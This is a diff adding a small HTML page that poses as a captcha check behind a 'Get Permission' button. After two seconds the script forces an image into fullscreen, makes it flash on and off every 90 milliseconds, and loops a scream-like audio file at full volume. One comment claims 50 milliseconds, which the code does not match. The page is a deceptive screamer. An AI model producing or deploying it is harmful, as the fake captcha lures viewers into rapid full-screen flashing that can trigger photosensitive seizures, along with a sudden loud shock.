@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fullscreen Image and Sound</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            flex-direction: column;
+        }
+        .button {
+            padding: 15px 30px;
+            background-color: gray;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .hidden {
+            display: none;
+        }
+        #captcha {
+            display: none;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        #image {
+            transition: opacity 0.1s linear; /* Уменьшено время перехода для резкого мигания */
+        }
+    </style>
+</head>
+<body>
+
+<div id="captcha" class="hidden">Пожалуйста, подтвердите, что вы не робот.</div>
+<button class="button" id="permissionButton">Get Permission</button>
+<img id="image" class="hidden" src="https://i.imgur.com/T1nKjgS.jpeg" alt="Image" />
+<audio id="audio" src="https://www.dropbox.com/scl/fi/4azo331kktuoqewlrnjw9/krikir.mp3?rlkey=xp2qpu1297kqjsmdprd5z0xsb&st=hn8vjams&dl=1" loop preload="auto"></audio>
+
+<script>
+    const audio = document.getElementById('audio');
+    const captcha = document.getElementById('captcha');
+    const img = document.getElementById('image');
+
+    document.getElementById('permissionButton').addEventListener('click', function() {
+        // Показать капчу
+        captcha.classList.remove('hidden');
+
+        // Имитация загрузки и ожидание 2 секунды
+        setTimeout(() => {
+            // Скрыть капчу
+            captcha.classList.add('hidden');
+
+            // Показать изображение и начать мигать
+            img.classList.remove('hidden');
+            let isVisible = true;
+
+            // Установить интервал на 50 миллисекунд для постоянного мигания
+            setInterval(() => {
+                img.style.opacity = isVisible ? '1' : '0';
+                isVisible = !isVisible;
+            }, 90); // Изменение состояния каждые 50 миллисекунд
+
+            // Подготовка к воспроизведению звука
+            audio.currentTime = 0; // Начать с начала
+            audio.volume = 1.0; // Установка громкости на максимум
+            audio.play(); // Воспроизводим звук
+
+            // Перейти в полноэкранный режим
+            if (img.requestFullscreen) {
+                img.requestFullscreen();
+            } else if (img.mozRequestFullScreen) { // Firefox
+                img.mozRequestFullScreen();
+            } else if (img.webkitRequestFullscreen) { // Chrome, Safari и Opera
+                img.webkitRequestFullscreen();
+            } else if (img.msRequestFullscreen) { // IE/Edge
+                img.msRequestFullscreen();
+            }
+
+        }, 2000); // 2000 миллисекунд = 2 секунды
+    });
+</script>
+
+</body>
+</html>
